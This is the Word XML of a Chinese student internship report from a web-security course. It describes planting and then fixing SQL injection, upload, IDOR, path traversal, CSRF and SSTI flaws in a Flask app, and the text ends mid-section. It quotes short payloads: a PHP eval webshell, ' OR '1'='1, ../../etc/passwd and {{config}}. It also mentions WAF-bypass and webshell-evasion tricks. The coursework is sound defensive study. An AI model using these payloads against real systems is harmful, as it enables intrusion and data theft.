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6"/>
        </w:rPr>
        <w:t>本  科  实  习  报  告</w:t>
      </w:r>
    </w:p>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
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>学　　院</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>网络空间安全学院</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>学生姓名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>任治宇</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>专　　业</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>网络空间安全</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>学　　号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>2024141531000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>年　　级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>2024级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>指导教师</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>陈腾</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>教务处制表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>二〇二六年七月二十七日</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2266"/>
        <w:gridCol w:w="2266"/>
        <w:gridCol w:w="2266"/>
        <w:gridCol w:w="2266"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>课程名称：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>网络安全实践-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>课程号码：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>314049020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>实习周数：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>课程学分：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>实习单位：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>四川讯方信息技术有限公司</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>实习地点：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>四川大学空天科学与工程学院四楼401</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:b/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>实习时间：</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>2026年7月18日-7月27日</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2266"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>一、实习目的、要求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>1、实习目的</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本次校内综合实训为网络空间安全专业必修实践环节，依托AI+Web安全实战模式，旨在让学生掌握Python Flask开发与全套安全工具运维能力，吃透十大Web漏洞成因、利用与加固方案。通过小组完成用户管理平台项目，熟悉AI代码审计、自动化攻防脚本开发，建立标准化工程开发流程。同步锻炼团队协作、项目交付与技术答辩能力，兼顾基础开发与安全攻防双向技能提升，树立AI开发安全风险防范意识，贴合企业网络安全岗位实战需求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2、实习基本要求</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>学生需具备基础编程与网络知识，全程以AI辅助开发，重点完成漏洞挖掘与加固，分层完成基础任务与高阶拓展内容。严格执行每日日清交付、双重考勤制度，规范Git版本管理，完整留存攻防日志与双版本项目代码。独立完成漏洞实操，杜绝抄袭，缺勤超2天将取消考核答辩资格。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>二、实习主要内容</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本次实习历时10天，以Python Flask框架为基础，从零构建了一个完整的用户信息管理系统，并在此基础上逐步叠加功能、引入漏洞、完成修复，系统性地覆盖了OWASP Top 10中的多项核心Web安全风险。项目代码全部托管于GitHub仓库（github.com/zhiyu-ren/-homework），每天的内容独立存放于Class01至Class09目录中，便于对比漏洞版本与修复版本的差异。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.1 项目基础搭建与安全加固（Day 01-Day 02）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Day 01：编写NPS（内网穿透代理）默认密码检测工具，使用Python批量检测admin/123默认口令，掌握FOFA搜索引擎资产收集方法。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Day 02：使用Flask框架搭建用户信息管理系统，实现登录/注册功能，并完成15项安全加固：密码PBKDF2-SHA256哈希存储、Secret Key环境变量隔离、Session安全配置（HttpOnly+SameSite+30分钟过期）、CSRF令牌保护、登录限流（每分钟10次）、账户锁定（5次失败锁定15分钟）、强密码策略（12位+大小写+数字+特殊字符）、安全审计日志、安全响应头（HSTS/X-Frame-Options等）、SQLite持久化存储等。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.2 SQL注入与WAF绕过（Day 03）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>在安全加固版基础上新增用户注册和搜索功能，但注册和搜索功能使用了f-string拼接SQL语句，存在SQL注入漏洞。具体表现为：INSERT语句直接拼接用户输入、LIKE查询直接拼接关键词。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SQL注入漏洞原理：用户输入直接拼接到SQL语句中，改变了SQL语法结构。例如搜索功能中keyword参数传入' OR '1'='1可使WHERE条件永远为真，返回全部用户数据。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：使用参数化查询（?占位符）替代f-string拼接，从根源上消除SQL注入风险。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>同时进行了安全狗WAF绕过Fuzz测试，覆盖90+种绕过手法，发现seleCT混合大小写可绕过SELECT关键字检测、@@version替代version()可绕过函数拦截等15+种绕过路径。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.3 文件上传漏洞与一句话木马（Day 04）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增头像上传功能，初始版本不做任何文件类型检查，存在任意文件上传漏洞，可上传PHP一句话木马。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>一句话木马原理：&lt;?php @eval($_POST['ant']); ?&gt;，攻击者通过POST请求即可执行任意PHP代码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：五层白名单校验——扩展名白名单（仅.jpg/.jpeg/.png/.gif）、服务端MIME类型校验、文件幻数校验（Magic Bytes）、UUID重命名防路径穿越、16MB文件大小限制。同时掌握了PHP变量函数、base64_decode、str_replace、parse_str等免杀绕过技巧。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.4 业务逻辑漏洞与水平越权（Day 05）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增个人中心（/profile?user_id=X）和充值功能（/recharge），存在两个典型业务逻辑漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>水平越权（IDOR）：user_id从URL参数获取，未验证当前登录用户，修改user_id即可查看任意用户资料（包括管理员）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>负值交易：充值金额未做正负校验，传入负数可扣减任意用户余额。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：user_id从session获取（不从URL参数获取）、金额校验amount &gt; 0、只能给自己充值。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.5 路径遍历漏洞（Day 06）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增动态页面加载功能（/page?name=help），使用os.path.join拼接用户输入到文件路径，未过滤../。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>路径遍历攻击：/page?name=../app.py可读取应用源码、/page?name=../../etc/passwd可读取系统密码文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：采用白名单机制（ALLOWED_PAGES = {'help', 'about', 'contact'}），不在白名单中的页面直接拒绝访问。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.6 CSRF跨站请求伪造（Day 07）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增修改密码功能（/change-password），初始版本存在三个漏洞：无CSRF Token验证、可从表单修改他人密码、无需原密码验证。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CSRF攻击场景：攻击者构造恶意页面，诱导已登录用户访问，浏览器自动携带Cookie发起修改密码请求。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：HMAC CSRF Token验证、从session获取当前用户（不从表单获取username）、必须验证原密码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
        </w:rPr>
        <w:t>2.7 SSTI服务器端模板注入（Day 08）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>新增欢迎页（/welcome?name=X）和反馈功能（/feedback），使用render_template_string + f-string拼接用户输入，存在SSTI漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>SSTI攻击：/welcome?name={{7*7}} → 页面显示49；/welcome?name={{config}} → 泄露Flask配置信息（含SECRET_KEY）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>修复方案：使用Jinja2模板变量（{{ name }}）传递用户输入，而非f-string拼接，利用Jinja2自动HTML转义机制防御。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>同时开发了SSTI漏洞扫描器（ssti_scanner.py），支持基础注入检测、属性/下标访问链检测、命令执行检测、文件读取检测、eval执行检测和延时盲注检测，并在两个靶场上验证通过。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
